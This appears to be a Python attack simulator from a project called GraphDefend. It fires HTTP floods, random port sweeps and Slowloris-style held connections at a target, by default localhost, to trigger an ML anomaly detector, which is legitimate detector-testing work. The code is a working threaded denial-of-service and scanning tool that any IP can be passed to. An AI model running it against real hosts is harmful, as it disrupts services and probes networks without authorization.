import socket
import threading
import time
import argparse
import sys
import random

def print_banner():
    print("""
=========================================================
      GRAPHDEFEND: MULTI-VECTOR ATTACK SIMULATOR
=========================================================
WARNING: Use only on authorized networks (localhost demo).
Generates True Mathematical Anomalies for the ML Pipeline
(High volume, abnormal packet timings, structural sweeps)
=========================================================
    """)

# 1. HTTP Flood (Flow / Volume Anomaly)
# Triggers Autoencoder: 'total_packets', 'total_bytes' feature spikes
def http_flood(target_ip, target_port, duration, stats, thread_id):
    timeout = time.time() + duration
    packets_sent = 0
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            # Send massive garbage payload to drastically skew byte/packet ratios
            payload = b"POST /api/upload HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nContent-Length: 100000\r\n\r\n" + (b"A" * 50000)
            s.send(payload)
            s.close()
            packets_sent += 1
        except Exception:
            pass
    stats[thread_id] = packets_sent

# 2. Port Sweep (Structural / Graph Anomaly)
# Triggers GNN: massive expansion of the adjacency matrix edges
def port_sweep(target_ip, duration, stats, thread_id):
    timeout = time.time() + duration
    connections_attempted = 0
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            port = random.randint(10000, 60000) # Rapidly touch random unassigned ports
            s.connect((target_ip, port))
            s.close()
        except Exception:
            pass # We expect connection refused, it still generates structural flow data (SYN, SYN-ACK, RST)
        connections_attempted += 1
    stats[thread_id] = connections_attempted

# 3. Slowloris Emulation (Inter-Arrival Time Anomaly)
# Triggers Autoencoder: 'iat_mean', 'flow_duration_sec' spikes
def slowloris(target_ip, target_port, duration, stats, thread_id):
    timeout = time.time() + duration
    sockets = []
    
    # Establish connections
    for _ in range(50):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            sockets.append(s)
        except:
            pass
            
    # Hold them open by sporadically sending tiny data
    while time.time() < timeout:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except Exception:
                sockets.remove(s)
        time.sleep(1)
        
    for s in sockets: 
        try:
            s.close()
        except:
            pass
    stats[thread_id] = len(sockets)

def attack_worker(thread_id, mode, target_ip, target_port, duration, stats):
    if mode == "flood":
        http_flood(target_ip, target_port, duration, stats, thread_id)
    elif mode == "sweep":
        port_sweep(target_ip, duration, stats, thread_id)
    elif mode == "slow":
        slowloris(target_ip, target_port, duration, stats, thread_id)
    else:
        stats[thread_id] = 0

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GraphDefend Local ML Anomaly Simulator")
    parser.add_argument("--ip", type=str, default="127.0.0.1", help="Target IP")
    parser.add_argument("--port", type=int, default=9999, help="Target Port (Default: 9999 to bypass ML whitelists)")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--duration", type=int, default=15, help="Duration in seconds")
    parser.add_argument("--mode", type=str, choices=["flood", "sweep", "slow", "all"], default="all", help="Attack vector")
    
    args = parser.parse_args()
    print_banner()

    print(f"[*] Target       : {args.ip}:{args.port}")
    print(f"[*] Vectors      : {args.mode.upper()}")
    
    print("\n[3] ⏳ Generating mathematical anomalies...")
    time.sleep(1)
    
    threads = []
    stats = {}
    
    # Launch threads
    for i in range(args.threads):
        # If 'all', cycle through the 3 attacks evenly across threads
        thread_mode = args.mode if args.mode != "all" else ["flood", "sweep", "slow"][i % 3]
        t = threading.Thread(target=attack_worker, args=(i, thread_mode, args.ip, args.port, args.duration, stats))
        threads.append(t)
        t.start()
        
    # Wait for completion
    for t in threads:
        t.join()
        
    total_requests = sum(stats.values())
    print(f"\n[+] Attack Simulation Complete!")
    print(f"[+] Total packets/requests fired: ~{total_requests}")
    print("[+] Check the Next.js Dashboard to see the anomaly detection (Critical / Red status expected).")
